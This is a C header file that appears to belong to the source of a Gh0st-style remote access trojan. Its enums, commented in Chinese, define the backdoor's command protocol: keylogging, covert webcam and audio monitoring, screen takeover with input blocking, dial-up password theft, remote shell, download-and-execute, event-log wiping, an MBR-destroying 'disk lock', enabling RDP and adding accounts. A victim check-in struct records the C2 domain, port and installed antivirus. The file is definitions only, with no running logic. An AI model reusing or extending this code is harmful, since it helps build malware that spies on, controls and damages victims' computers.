
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

// BYTE最大也就256
enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送
	
	// 控制端发出的命令
	COMMAND_ACTIVED = 0x00,			// 服务端可以激活开始工作
	COMMAND_LIST_DRIVE,				// 列出磁盘目录
	COMMAND_LIST_FILES,				// 列出目录中的文件
	COMMAND_DOWN_FILES,				// 下载文件
	COMMAND_FILE_SIZE,				// 上传时的文件大小
	COMMAND_FILE_DATA,				// 上传时的文件数据
	COMMAND_EXCEPTION,				// 传输发生异常，需要重新传输
	COMMAND_CONTINUE,				// 传输正常，请求继续发送数据
	COMMAND_STOP,					// 传输中止
	COMMAND_DELETE_FILE,			// 删除文件
	COMMAND_DELETE_DIRECTORY,		// 删除目录
	COMMAND_SET_TRANSFER_MODE,		// 设置传输方式
	COMMAND_CREATE_FOLDER,			// 创建文件夹
	COMMAND_RENAME_FILE,			// 文件或文件改名
	COMMAND_OPEN_FILE_SHOW,			// 显示打开文件
	COMMAND_OPEN_FILE_HIDE,			// 隐藏打开文件
	
	COMMAND_SCREEN_SPY,				// 屏幕查看
	COMMAND_SCREEN_RESET,			// 改变屏幕深度
	COMMAND_ALGORITHM_RESET,		// 改变算法
	COMMAND_SCREEN_CTRL_ALT_DEL,	// 发送Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// 屏幕控制
	COMMAND_SCREEN_BLOCK_INPUT,		// 锁定服务端键盘鼠标输入
	COMMAND_SCREEN_BLANK,			// 服务端黑屏
	COMMAND_SCREEN_CAPTURE_LAYER,	// 捕捉层
	COMMAND_SCREEN_GET_CLIPBOARD,	// 获取远程剪贴版
	COMMAND_SCREEN_SET_CLIPBOARD,	// 设置远程剪帖版

	COMMAND_WEBCAM,					// 摄像头
	COMMAND_WEBCAM_ENABLECOMPRESS,	// 摄像头数据要求经过H263压缩
	COMMAND_WEBCAM_DISABLECOMPRESS,	// 摄像头数据要求原始高清模式
	COMMAND_WEBCAM_RESIZE,			// 摄像头调整分辩率，后面跟两个INT型的宽高
	COMMAND_NEXT,					// 下一步(控制端已经打开对话框)

	COMMAND_KEYBOARD,				// 键盘记录
	COMMAND_KEYBOARD_OFFLINE,		// 开启离线键盘记录
	COMMAND_KEYBOARD_CLEAR,			// 清除键盘记录内容

	COMMAND_AUDIO,					// 语音监听

	COMMAND_SYSTEM,					// 系统管理（进程，窗口....）
	COMMAND_SYSTEMINFO,				// 进程列表
	COMMAND_PSLIST,					// 进程列表
	COMMAND_WSLIST,					// 窗口列表
	COMMAND_DIALUPASS,				// 拨号密码
	COMMAND_KILLPROCESS,			// 关闭进程
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// 会话管理（关机，重启，注销, 卸载）
	COMMAND_REMOVE,					// 卸载后门
	COMMAND_DOWN_EXEC,				// 其它功能 - 下载执行
	COMMAND_UPDATE_SERVER,			// 其它功能 - 下载更新
	COMMAND_CLEAN_System,			// 其它管理 - 清除系统日志
	COMMAND_CLEAN_Security,			// 其它管理 - 清除系统日志
	COMMAND_CLEAN_Application,		// 其它管理 - 清除系统日志
	COMMAND_CLEAN_ALL,			    // 其它管理 - 清除系统日志
	COMMAND_OPEN_URL_HIDE,			// 其它管理 - 隐藏打开网页
	COMMAND_OPEN_URL_SHOW,			// 其它管理 - 显示打开网页
	COMMAND_RENAME_REMARK,			// 重命名备注
	COMMAND_REPLAY_HEARTBEAT,		// 回复心跳包
	//////////////////////新功能////////////////////////

	COMMAND_CHANGE_GROUP,			// 更改分组
	COMMAND_SENDFILE_HIDE,			// 隐藏运行
	COMMAND_SENDFILE_NORMAL,		// 显示运行
	COMMAND_SENDFILE_NOSTART,		// 不去运行
	COMMAND_SENDFILE_UPDATA,		// 更新运行
	COMMAND_OPEN_PROXY,				// 开启代理
	COMMAND_SHOW_MSG,				// 发送信息
	COMMAND_KILL_MBR,				// 硬盘锁
	COMMAND_PORT_MAPPING,			// 端口映射

	/////////////////////////////////////////////////////
    COMMAND_SERVER_START,		    // 服务器管理
	COMMAND_USER_LIST,		        // 用户
	COMMAND_NETWORK_LIST,		    // 网络
	COMMAND_SERVER_PORT,		    // 服务器端口修改
	COMMAND_OPEN_3389,				// 开启3389
	COMMAND_NET_USER,				// 无NET添加用户
	COMMAND_NET_YHSX,		        // 用户刷新
	COMMAND_NET_START,		        // 帐户启动
	COMMAND_NET_DISABLE,		    // 帐户禁用
	COMMAND_NET_DEL,		        // 帐户删除
	COMMAND_RENAME_PASSWORD,        // 帐户密码修改
	COMMAND_NRTWORK_CARD,           // 网络适配器刷新
	COMMAND_DEL_SHIFTOSK,           // 软键盘及放大镜删除
/*
	COMMAND_GUANGQU,				// 弹出光驱
	COMMAND_GUANGQU2,				// 收回光驱
	COMMAND_ZHUOMIAN,				// 桌面隐藏
	COMMAND_ZHUOMIAN1,				// 显示隐藏
	COMMAND_ZAOYIN,					// 噪音
	COMMAND_SHANPIN,				// 闪屏
	COMMAND_XIANSHIQI,				// 关闭显示器
	COMMAND_XIANSHIQI2,				// 打开显示器
	COMMAND_RENWULAN,				// 隐藏任务栏
	COMMAND_RENWULAN2,				// 显示任务栏
	COMMAND_MOUSE,				    // 显示任务栏
	COMMAND_MOUSE2,				    // 显示任务栏
*/
	COMMAND_SERMANAGER,				// 服务管理 
	COMMAND_SSLIST,					// 服务列表
	COMMAND_STARTSERVERICE,			// 启动服务
	COMMAND_STOPSERVERICE,			// 停止服务
	COMMAND_DELETESERVERICE,		// 删除服务
	COMMAND_CREATSERVERICE,			// 创建服务
	COMMAND_AUTOSERVERICE,			// 自启动
	COMMAND_HANDSERVERICE,			// 手动
	COMMAND_DISABLESERVERICE,		// 禁止

	COMMAND_SERVERS_SETOPT,         //设置服务启动项          
	COMMAND_SERVERS_DEL,            //删除指定服务
	COMMAND_REGEDIT,                //注册表管理
	COMMAND_REG_FIND,               //查询该项  
	COMMAND_REG_DELPATH,            //删除项
	COMMAND_REG_CREATEPATH,         //创建项
	COMMAND_REG_DELKEY,             //删除键
    COMMAND_REG_CREATKEY,           //创建键

//	COMMAND_FINDALL_PROCESS,		// 进程筛选全部
//	COMMAND_FIND_PROCESS,			// 进程筛选

	// 服务端发出的标识
	TOKEN_AUTH = 100,				// 要求验证
	TOKEN_HEARTBEAT,				// 心跳包
	TOKEN_LOGIN,					// 上线包
	TOKEN_DRIVE_LIST,				// 驱动器列表
	TOKEN_FILE_LIST,				// 文件列表
	TOKEN_FILE_SIZE,				// 文件大小，传输文件时用
	TOKEN_FILE_DATA,				// 文件数据
	TOKEN_TRANSFER_FINISH,			// 传输完毕
	TOKEN_DELETE_FINISH,			// 删除完毕
	TOKEN_GET_TRANSFER_MODE,		// 得到文件传输方式
	TOKEN_GET_FILEDATA,				// 远程得到本地文件数据
	TOKEN_CREATEFOLDER_FINISH,		// 创建文件夹任务完成
	TOKEN_DATA_CONTINUE,			// 继续传输数据
	TOKEN_RENAME_FINISH,			// 改名操作完成
	TOKEN_EXCEPTION,				// 操作发生异常
	
	TOKEN_BITMAPINFO,				// 屏幕查看的BITMAPINFO
	TOKEN_FIRSTSCREEN,				// 屏幕查看的第一张图
	TOKEN_NEXTSCREEN,				// 屏幕查看的下一张图
	TOKEN_CLIPBOARD_TEXT,			// 屏幕查看时发送剪帖版内容


	TOKEN_WEBCAM_BITMAPINFO,		// 摄像头的BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// 摄像头的图像数据
	
	TOKEN_AUDIO_START,				// 开始语音监听
	TOKEN_AUDIO_DATA,				// 语音监听数据

	TOKEN_KEYBOARD_START,			// 键盘记录开始
	TOKEN_KEYBOARD_DATA,			// 键盘记录的数据
	
	TOKEN_PSLIST,					// 进程列表
	TOKEN_WSLIST,					// 窗口列表
	TOKEN_DIALUPASS,				// 拨号密码
	TOKEN_SHELL_START,				// 远程终端开始
	TOKEN_USER_LIST,			    // 服务器用户列表
	TOKEN_NETWORK_LIST,			    // 服务器网络列表

	// 新功能
	TOKEN_SYSTEMINFO,				// 系统信息
	TOKEN_SSLIST,					// 服务管理
//	TOKEN_FIND_NO,					// 筛选.返回不存在
//	TOKEN_FINDALL_NO,				// 筛选全部.返回不存在

	TOKEN_REGEDIT,                  // 打开注册表界面
    TOKEN_REG_PATH,                 // 发送注册表项名
	TOKEN_REG_KEY,                  // 发送键名
	TOKEN_REG_OK,                   // 执行成功
	TOKEN_REG_NO                    // 执行失败
};


typedef struct 
{
	BYTE bToken;		   // = 1	
	CHAR szCpuSpeend[32];  //cpu速度 
	CHAR szCpuInfo[128];   //CPU信息
	CHAR szPcName[50];     //计算机名称
	CHAR szUserName[32];   //用户名
	CHAR szScrSize[32];    //屏幕分辨率
	CHAR LineName[100];    //上线域名
	CHAR LinePort[32];     //上线端口
	CHAR Program[256];     //程序途径
	CHAR InstallOpen[100]; //程序运行方式
	CHAR szUserVirus[256]; //用户杀毒软件
}MESSAGEInfo;


#define IDR_ENCODE 513		//资源中的上线信息
#define IDR_CONFIG 514		//资源中的服务信息
#define	MAX_WRITE_RETRY			15 // 重试写入文件次数
#define	MAX_SEND_BUFFER			1024 * 8 // 最大发送数据长度
#define MAX_RECV_BUFFER			1024 * 8 // 最大接收数据长度

#endif // !defined(AFX_MACROS_H_INCLUDED)